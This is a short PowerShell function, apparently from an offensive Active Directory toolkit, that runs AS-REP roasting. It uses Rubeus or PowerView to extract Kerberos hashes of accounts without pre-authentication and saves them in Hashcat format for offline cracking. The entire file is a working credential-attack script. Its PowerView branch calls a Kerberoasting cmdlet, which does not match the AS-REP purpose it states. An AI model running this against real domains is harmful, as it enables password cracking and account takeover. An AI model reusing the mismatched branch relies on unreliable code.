function Invoke-QuickASREPRoast {
    <#
    .SYNOPSIS
        Extract AS-REP hashes for accounts without pre-authentication.

    .DESCRIPTION
        Automatically detects available tooling (Rubeus.exe or PowerView)
        and extracts AS-REP hashes in Hashcat format for offline cracking.

    .PARAMETER OutputDir
        Directory to write hash files. Created if it doesn't exist.

    .EXAMPLE
        Invoke-QuickASREPRoast -OutputDir C:\Temp\Roast
    #>

    param(
        [string]$OutputDir = "C:\Temp\Roast"
    )

    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
    Write-Host "`n[*] AS-REP Roasting..." -ForegroundColor Cyan

    $hashFile = "$OutputDir\asrep_hashes.txt"

    if (Test-Path ".\Rubeus.exe") {
        & .\Rubeus.exe asreproast /format:hashcat /outfile:"$hashFile"
    }
    elseif (Get-Command Get-DomainUser -ErrorAction SilentlyContinue) {
        Get-DomainUser -PreauthNotRequired |
            Get-DomainSPNTicket -Format Hashcat |
            Select-Object -ExpandProperty Hash |
            Out-File $hashFile
    }
    else {
        Write-Host "[-] No AS-REP Roast tool available. Load Rubeus or PowerView." -ForegroundColor Red
        return
    }

    Write-Host "[+] AS-REP hashes saved to $OutputDir" -ForegroundColor Green
}